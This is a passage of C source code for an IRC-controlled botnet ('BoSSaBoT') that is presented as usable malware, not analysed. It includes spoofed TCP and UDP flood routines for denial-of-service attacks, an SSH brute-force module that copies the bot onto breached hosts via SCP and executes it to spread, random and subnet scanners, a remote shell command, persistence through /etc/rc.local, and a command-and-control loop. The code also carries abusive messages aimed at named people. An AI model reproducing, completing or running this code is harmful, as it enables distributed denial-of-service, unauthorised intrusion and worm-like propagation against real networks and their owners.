        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 1;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 0;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;


        while(1) {
                saddr=getspoof();
                if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));


                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}
void unknown(int sock, char *sender, int argc, char **argv) {
	int flag=1,fd,i;
	unsigned long secs;
	char *buf=(char*)malloc(9216);
 	struct hostent *hp;
	struct sockaddr_in in;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,"NOTICE %s :UNKNOWN <target> <secs>\n",sender);
                exit(1);
        }
        secs=atol(argv[2]);
	memset((void*)&in,0,sizeof(struct sockaddr_in));
	in.sin_addr.s_addr=host2ip(sender,argv[1]);
	in.sin_family = AF_INET;
        Send(sock,"NOTICE %s :Unknowning %s.\n",sender,argv[1]);
	while(1) {
		in.sin_port = rand();
		if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
		else {
			flag=1;
			ioctl(fd,FIONBIO,&flag);
			sendto(fd,buf,9216,0,(struct sockaddr*)&in,sizeof(in));
			close(fd);
		}
                if (i >= 50) {
                        if (time(NULL) >= start+secs) break;
                        i=0;
                }
                i++;
	}
        close(fd);
	exit(0);
}
 void getspoofs(int sock, char *sender, int argc, char **argv) {
         unsigned long a=spoofs,b=spoofs+(spoofsm-1);
         if (spoofsm == 1) Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0]);
         else Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
 }
void checkauth(char *sender, char *user, char *password,char *host)
{
	int port = 22;
	ssh_session br_ssh_session = ssh_new();


       if (br_ssh_session == NULL){
//	Send(sock,"NOTICE %s :ssh session fails %s\n",chan);
		exit(-1);
}else{
//	Send(sock,"NOTICE %s :ssh session erstellt mit U: %s P: %s H: %s\n",chan,user,password,host);
	}



alarm(10);
      ssh_options_set(br_ssh_session, SSH_OPTIONS_USER, user);
      ssh_options_set(br_ssh_session, SSH_OPTIONS_HOST, host);
	ssh_options_set(br_ssh_session, SSH_OPTIONS_PORT, &port);
        int rc = ssh_connect(br_ssh_session);
        if (rc == SSH_ERROR) {
        	ssh_disconnect(br_ssh_session);
//Send(sock,"NOTICE %s :error %s\n",chan,host);
              ssh_free(br_ssh_session);
}else{
       // ssh_userauth_autopubkey(br_ssh_session);
//Send(sock,"NOTICE %s :PUBKEY %s\n",chan,host);
};
        int state = ssh_userauth_autopubkey(br_ssh_session, NULL);
//Send(sock,"NOTICE %s :pubkey angenommen? %s\n",chan,host);
        int upa = ssh_userauth_password(br_ssh_session, user, password);

//Send(sock,"NOTICE %s :BRUTE: U: %s P: %s IP: %s \n",chan,user,password,host); sleep(1);
        if (upa != SSH_AUTH_SUCCESS ){
//		ssh_get_error(br_ssh_session, SSH_REQUEST_DENIED, "Connection refused");
      		ssh_disconnect(br_ssh_session);
		ssh_free(br_ssh_session);
          }else{
//int sshv = ssh_get_openssh_version(br_ssh_session("*OpenSSH*"));
//int sshv = ssh_version(SSH_VERSION_INT(0,2,1));
//////////////////////////////////////////////////////////////////
      char buff[200], data[] = "\r\n\r\n\r\n";
      int len = strlen(data);
      int sck;
      struct sockaddr_in remote;
      struct hostent *he;
            he = gethostbyname(host);

      remote.sin_family = AF_INET;
      remote.sin_port = htons(22);
      memcpy(&remote.sin_addr, he->h_addr, he->h_length);
       sck = socket(AF_INET, SOCK_STREAM, 0);

     connect(sck,(struct sockaddr *)&remote, sizeof(struct sockaddr));


      send(sock, data, len, 0);
      read(sck,buff, sizeof(buff));

///////////////////////////////////////////////////////////////////
Send(sock,"NOTICE %s :OWNED:[ %s / %s ]IP:[ %s ] \n",chan,user,password,host); sleep(2);

/////////////////////////////////////////////////////////////////////
/////////////////////////SPREAD//////////////////////////////////////
////////////////////////////////////////////////////////////////////
    const char *loclfile=FILENAME;
    const char *scppath=DESTDIR;
    FILE *f;
    int rc;
    char *buffer;
    size_t count;
    char *ptr;
    long lSize;
    size_t result;
    int scpinit;
    int position = 0;
ssh_scp scp;
scp=ssh_scp_new(br_ssh_session, SSH_SCP_WRITE | SSH_SCP_RECURSIVE ,DESTDIR );
scpinit=ssh_scp_init(scp);
f = fopen(loclfile, "rb");


fseek (f , 0 , SEEK_END);
  lSize = ftell (f);
  rewind (f);

buffer = (char*) malloc (sizeof(char)*lSize);
result = fread (buffer,1,lSize,f);
//position = result;
ssh_scp_push_file(scp, loclfile ,result, S_IRUSR | S_IWUSR);
                buffer += position;
                result -= position;
alarm(60);
if (ssh_scp_write(scp,buffer, result) != SSH_OK);
////////////////////////////////
////////////////////////////////
         //??channel???????
	//..channel.......
	ssh_channel channel;
	channel = ssh_channel_new(br_ssh_session);
	if (channel == NULL){
		Send(sock,"NOTICE %s :kanalfail\n",chan);
		return SSH_ERROR;
	}
	rc = ssh_channel_open_session(channel);
	if (rc != SSH_OK)
	{
		Send(sock,"NOTICE %s :kanalok\n",chan);
		ssh_channel_free(channel);
		return rc;
	}
//spread
int spread;
spread = ssh_channel_request_exec(channel,EXECUTION);

Send(sock,"NOTICE %s :SPREADED ON %s: %s \n",chan,host,buff);
      close(sck);
}
}

void scanrnd(int sock, char *sender, int argc, char **argv) {
        char *temp;
        char *ip_ptr;
        int a,b,c,d;
        char ip[20];
        unsigned long secs;
        time_t start=time(NULL);
        int maxchilds=100,status,pgid;
	char *subnet = NULL;
        int sub =0;
        pid_t pid;



                                temp=argv[1];

                                maxchilds=atoi(argv[2]);


        if (running == 1) {
        Send(sock,"NOTICE %s :[SSHSCAN RUNNING!!!]\n",chan);
        return;
        }

        secs=atoi(argv[3]);
        running=1;
        Send(sock,"NOTICE %s :[RANDOMSCAN STARTED]SUBNET[ %s ]THREADS[ %s ]TIME[ %s ]\n",chan,argv[1],argv[2],argv[3]);
        pid = fork();


if(pid == 0) {

		        while(1){
                        if(time(NULL) >= start+secs * 60){
                        running=0;
                        Send(sock,"NOTICE %s :[WAITING OF THREADS] \n",chan);
                        while (--childs) wait(NULL);
                        kill((pid_t) getppid(), SIGTERM);
                        Send(sock,"NOTICE %s :[SCAN DONE] \n",chan);
                        break;
                        }

//////////////////RIPPED by rbot thx nils//////////////////////
	int ip1,ip2,ip3,ip4;
	if (strlen(temp)>15) return 0;
	ip1=-1;ip2=-1;ip3=-1;ip4=-1;
	sscanf(temp,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand()%255;
	if (ip2==-1) ip2=rand()%255;
	if (ip3==-1) ip3=rand()%255;
	if (ip4==-1) ip4=rand()%255;
///////////////////////////////////////////////////////////////
//Send(sock,"NOTICE %s : ip:%d.%d.%d.%d \n",chan,ip1,ip2,ip3,ip4);
if (childs >= maxchilds) wait(NULL);
(void) sprintf(ip, "%d.%d.%d.%d",ip1,ip2,ip3,ip4);
//Send(sock,"NOTICE %s : ip: %i.%i.%i.%i \n",chan,a,b,c,d);





switch(fork()) {
                                        case 0:
                                        #include "pass.h"
                                        exit(0);
                                        case -1 :
                                 Send(sock,"NOTICE %s : MINUS NULL CASE \n",chan);
                                        break;
					default:
                                        ++childs;
                                        break;
				}
		}
        }

}

void scansub(int sock, char *sender, int argc, char **argv) {
        char *temp;
        char *ip_ptr;
        int a,b,c,d;
        char ip[20];
        char *subnet = NULL;
        unsigned long secs;
        time_t start=time(NULL);
        int maxchilds=100,status,pgid;
        int sub =0;
        pid_t pid;



                                  subnet = malloc(strlen(argv[1]) + 1);
				      strcpy(subnet, argv[1]);

                                maxchilds=atoi(argv[2]);


        if (running == 1) {
        Send(sock,"NOTICE %s :[SSHSCAN RUNNING!!!]\n",chan);
        return;
        }

        running=1;
        Send(sock,"NOTICE %s :[SUBNETSCAN STARTED]SUBNET[ %s ]THREADS[ %s ]\n",chan,argv[1],argv[2]);
        pid = fork();


if(pid == 0) {

	              for (a = 0; a <= 255; ++a) {
			for (b = 0; b <= 255; ++b) {
				if (childs >= maxchilds)
          wait(NULL);

				(void) sprintf(ip, "%s.%i.%i", subnet, a, b);
//Send(sock,"NOTICE %s : ip: %s.%i.%i \n",chan,subnet, a, b);

switch(fork()) {
                                        case 0:
                                        #include "pass.h"
                                        exit(0);
                                        case -1 :
                                 Send(sock,"NOTICE %s : MINUS NULL CASE \n",chan);
                                        break;
					default:
                                        ++childs;
                                        break;
					}

			}

		}
                        running=0;
                        Send(sock,"NOTICE %s :[WAITING OF THREADS] \n",chan);
                        while (--childs) wait(NULL);
                        kill((pid_t) getppid(), SIGTERM);
                        Send(sock,"NOTICE %s :[SCAN DONE] \n",chan);
	}

return;

 
}
void msleep(unsigned int pause) // ca. 1/1000 Sekunde Pause blockierend
{
	while(pause--) sleep(72);
}

 void help(int sock,char *cmd) {
Send(sock,"NOTICE %s :BoSSaBoT by BoSSaLiNiE Priv Versionn\n",chan); sleep(1);
Send(sock,"NOTICE %s :SCANRND <192 or 192.168 or 192.168.0> <threads> <minutes> = Random Scan\n",chan); sleep(1);
Send(sock,"NOTICE %s :SCANSUB <192.168> <threads>                               = Complete Subnet scan\n",chan); sleep(1);
Send(sock,"NOTICE %s :RANDOMFLOOD <target> <port> <secs>\n",chan); sleep(1);
Send(sock,"NOTICE %s :NSACKFLOOD <target> <port> <secs>\n",chan); sleep(1);
Send(sock,"NOTICE %s :NSSYNFLOOD <target> <port> <secs>\n",chan); sleep(1);
Send(sock,"NOTICE %s :SYNFLOOD <target> <port> <secs>\n",chan); sleep(1);
Send(sock,"NOTICE %s :UDP <target> <port> <secs>\n",chan); sleep(1);
Send(sock,"NOTICE %s :UNKNOWN <target> <secs>\n",chan); sleep(1);
Send(sock,"NOTICE %s :UPDATE <host> <bin>\n",chan); sleep(1);
Send(sock,"NOTICE %s :THX                                                       = THX to\n",chan); sleep(1);
Send(sock,"NOTICE %s :FUCKERS                                                   = About fuckers\n",chan); sleep(1);
         return;
 }
void thx(int sock, char *sender, int argc, char **argv) {

Send(sock,"NOTICE %s :BoSSaLiNiE says Thanks to.....\n",chan); sleep(1);
Send(sock,"NOTICE %s :-->Lioba aka Gohan<--: MENTAL,TECHNICAL,HELP\n",chan); sleep(1);
Send(sock,"NOTICE %s :-->Dr. Simone Luchetta<--source attacks are almost completly rewrited by Dr.Simone Luchetta.....\n",chan); sleep(1);
Send(sock,"NOTICE %s :-->Helel Ben-Shachar<-- The Shining One, Son of the Dawn!\n",chan); sleep(1);
Send(sock,"NOTICE %s :........There are presents: ackflood, the infamous nsackflood, an improved.......\n",chan); sleep(1);
Send(sock,"NOTICE %s :.......version of synflood and others (like randomflood)\n",chan); sleep(1);
Send(sock,"NOTICE %s :......puts me in the psychiatry but BoSSaLiNiE is the new hope\n",chan); sleep(1);
         return;
 }
 void fuckers(int sock, char *sender, int argc, char **argv) {

Send(sock,"NOTICE %s :BoSSaLiNiE says Fuck You !!! To.....\n",chan); sleep(1);
Send(sock,"NOTICE %s :Firewire2002 You Ass Fucked By Youe Daddy Piss Head \n",chan); sleep(1);
Send(sock,"NOTICE %s :Fuck You To byte You Damn Shit Nugget\n",chan); sleep(1);
        return;
 }

 void version(int sock, char *sender, int argc, char *argv[]) {
Send(sock,"NOTICE %s BoSSaBoT %s Helel mod 1.0 - Ezba' Elohim + PRIV SSH+Spread-Mod by BoSSaLiNiE\n",chan,VERSION);
 }
 void nickc(int sock, char *sender, int argc, char **argv) {
         if (argc != 1) {
                 Send(sock,"NOTICE %s :NICK <nick>\n",sender);
                 return;
         }
         if (strlen(argv[1]) >= 10) {
                 Send(sock,"NOTICE %s :Nick cannot be larger than 9 characters.\n",sender);
                 return;
         }
         Send(sock,"NICK %s\n",argv[1]);
 }
void move(int sock, char *sender, int argc, char **argv) {
        if (argc < 1) {
                Send(sock,"NOTICE %s :MOVE <server>\n",sender);
                exit(1);
        }
	server=strdup(argv[1]);
	changeservers=1;
	close(sock);
}
void killall(int sock, char *sender, int argc, char **argv) {
        unsigned long i;
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        if (sender) Send(sock,"NOTICE %s :Killing pid %d.\n",sender,pids[i]);
                        kill(pids[i],9);
                }
        }
}
void killd(int sock, char *sender, int argc, char **argv) {
	if (!disable) kill(0,9);
	else Send(sock,"NOTICE %s :Unable to comply.\n");
}
static struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } 
flooders[] = {
       { "UPDATE", update},
       { "RANDOMFLOOD", randomflood},
       { "NSACKFLOOD", nsackflood },
       { "NSSYNFLOOD", nssynflood },
       { "ACKFLOOD", ackflood },
       { "SYNFLOOD", synflood },
       { "UDP", udp },
       { "UNKNOWN", unknown }, 
       { "THX", thx},
       { "NICK", nickc },
       { "SERVER", move },
       { "GETSPOOFS", getspoofs },
       { "SPOOFS", spoof },
       { "GET", get },
       { "VERSION", version },
       { "KILL", killd },
       { "KILLALL", killall },
       { "HELP", help },
       { "FUCKERS", fuckers },
       { "SCANRND", scanrnd },
       { "SCANSUB", scansub },
 { (char *)0, (void (*)(int,char *,int,char **))0 }
};






 void _PRIVMSG(int sock, char *sender, char *str) {
        int i;
        char *to, *message;
        for (i=0;i<strlen(str) && str[i] != ' ';i++);
        str[i]=0;
        to=str;
        message=str+i+2;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
        if (*message == '!' && !strcasecmp(to,chan)) {
                char *params[12], name[1024]={0};
                int num_params=0, m;
                message++;
                for (i=0;i<strlen(message) && message[i] != ' ';i++);
                message[i]=0;
                if (strwildmatch(message,nick)) return;
                message+=i+1;
                if (!strncmp(message,"IRC ",4)) if (disabled) Send(sock,"NOTICE %s :Unable to comply.\n",sender); else Send(sock,"%s\n",message+4);
                if (!strncmp(message,"SH ",3)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s",message+3);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                }
                m=strlen(message);
                for (i=0;i<m;i++) {
                        if (*message == ' ' || *message == 0) break;
                        name[i]=*message;
                        message++;
                }
                for (i=0;i<strlen(message);i++) if (message[i] == ' ') num_params++;
                num_params++;
                if (num_params > 10) num_params=10;
                params[0]=name;
                params[num_params+1]="\0";
                m=1;
                while (*message != 0) {
                        message++;
                        if (m >= num_params) break;
                        for (i=0;i<strlen(message) && message[i] != ' ';i++);
                        params[m]=(char*)malloc(i+1);
                        strncpy(params[m],message,i);
                        params[m][i]=0;
                        m++;
                        message+=i;
                }
                for (m=0; flooders[m].cmd != (char *)0; m++) {
                        if (!strcasecmp(flooders[m].cmd,name)) {
                                flooders[m].func(sock,sender,num_params-1,params);
                                for (i=1;i<num_params;i++) free(params[i]);
                                return;
                        }
                }
        }
}
void _376(int sock, char *sender, char *str) {
        Send(sock,"MODE %s -xi\n",nick);
        Send(sock,"JOIN %s :%s\n",chan,key);
}
void _PING(int sock, char *sender, char *str) {
        Send(sock,"PONG %s\n",str);
}
void _352(int sock, char *sender, char *str) {
        int i,d;
        char *msg=str;
        struct hostent *hostm;
        unsigned long m;
        for (i=0,d=0;d<5;d++) {
                for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                if (i == strlen(str)) return;
        }
        for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
        msg[i]=0;
        if (!strcasecmp(msg,nick) && !spoofsm) {
                msg=str;
                for (i=0,d=0;d<3;d++) {
                        for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                        if (i == strlen(str)) return;
                }
                for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
                msg[i]=0;
                if ((m = inet_addr(msg)) == -1) {
                        if ((hostm=gethostbyname(msg)) == NULL) {
                                Send(sock,"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n",chan);
                                return;
                        }
                        memcpy((char*)&m, hostm->h_addr, hostm->h_length);
                }
                ((char*)&spoofs)[3]=((char*)&m)[0];
                ((char*)&spoofs)[2]=((char*)&m)[1];
                ((char*)&spoofs)[1]=((char*)&m)[2];
                ((char*)&spoofs)[0]=0;
                spoofsm=256;
        }
}
void _433(int sock, char *sender, char *str) {
        free(nick);
        nick=makestring();
}
void _NICK(int sock, char *sender, char *str) {
	int i;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
	if (!strcasecmp(sender,nick)) {
		if (*str == ':') str++;
		if (nick) free(nick);
		nick=strdup(str);
	}
}
struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
        { "352", _352 },
        { "376", _376 },
        { "433", _433 },
        { "422", _376 },
        { "PRIVMSG", _PRIVMSG },
        { "PING", _PING },
	{ "NICK", _NICK },
{ (char *)0, (void (*)(int,char *,char *))0 } };
void con() {
        struct sockaddr_in srv;
        unsigned long ipaddr,start;
        int flag;
        struct hostent *hp;
start:
	sock=-1;
	flag=1;
	if (changeservers == 0) server=servers[rand()%numservers];
	changeservers=0;
        while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
	if (inet_addr(server) == 0 || inet_addr(server) == -1) {
		if ((hp = gethostbyname(server)) == NULL) {
			server=NULL;
			close(sock);
			goto start;
		}
		bcopy((char*)hp->h_addr, (char*)&srv.sin_addr, hp->h_length);
	}
	else srv.sin_addr.s_addr=inet_addr(server);
        srv.sin_family = AF_INET;
        srv.sin_port = htons(PORT);
	ioctl(sock,FIONBIO,&flag);
	start=time(NULL);
	while(time(NULL)-start < 10) {
		errno=0;
		if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0 || errno == EISCONN) {
		        setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
			return;
		}
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
		sleep(1);
	}
	server=NULL;
	close(sock);
	goto start;
}
int main(int argc, char **argv) {
        int on,i;
        char cwd[256],*str;
        FILE *file;
	str="/etc/rc.local";
	file=fopen(str,"r");
	if (file == NULL) {
		str="/etc/rc.conf";
		file=fopen(str,"r");
	}
        if (file != NULL) {
                char outfile[256], buf[1024];
                int i=strlen(argv[0]), d=0;
                getcwd(cwd,256);
                if (strcmp(cwd,"/")) {
                        while(argv[0][i] != '/') i--;
                        sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
                        while(!feof(file)) {
                                fgets(buf,1024,file);
                                if (!strcasecmp(buf,outfile)) d++;
                        }
                        if (d == 0) {
                                FILE *out;
                                fclose(file);
                                out=fopen(str,"a");
                                if (out != NULL) {
                                        fputs(outfile,out);
                                        fclose(out);
                                }
                        }
                        else fclose(file);
                }
                else fclose(file);
        }
        if (fork()) exit(0);
#ifdef FAKENAME
	strncpy(argv[0],FAKENAME,strlen(argv[0]));
        for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
#endif
        srand((time(NULL) ^ getpid()) + getppid());
        nick=makestring();
        ident=makestring();
        user=makestring();
        chan=CHAN;
	key=KEY;
	server=NULL;
sa:
#ifdef IDENT
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        kill(pids[i],9);
			waitpid(pids[i],NULL,WNOHANG);
                }
        }
	pids=NULL;
	numpids=0;
	identd();
#endif
	con();
        Send(sock,"NICK %s\nUSER x00 localhost localhost :#scantest\n",nick);
        while(1) {
                unsigned long i;
                fd_set n;
                struct timeval tv;
                FD_ZERO(&n);
                FD_SET(sock,&n);
                tv.tv_sec=60*20;
                tv.tv_usec=0;
                if (select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) goto sa;
                for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
                        unsigned int *newpids,on;
                        for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
			pids[on-1]=0;
                        numpids--;
                        newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
                        for (on=0;on<numpids;on++) newpids[on]=pids[on];
                        free(pids);
                        pids=newpids;
                }
                if (FD_ISSET(sock,&n)) {
                        char buf[4096], *str;
                        int i;
                        if ((i=recv(sock,buf,4096,0)) <= 0) goto sa;
                        buf[i]=0;
                        str=strtok(buf,"\n");
                        while(str && *str) {
                                char name[1024], sender[1024];
                                filter(str);
                                if (*str == ':') {
                                        for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                        str[i]=0;
                                        strcpy(sender,str+1);
                                        strcpy(str,str+i+1);
                                }
                                else strcpy(sender,"*");
                                for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                str[i]=0;
                                strcpy(name,str);
                                strcpy(str,str+i+1);
                                for (i=0;msgs[i].cmd != (char *)0;i++) if (!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock,sender,str);
                                if (!strcasecmp(name,"ERROR")) goto sa;
                                str=strtok((char*)NULL,"\n");
                        }
                }
        }
        return 0;
}
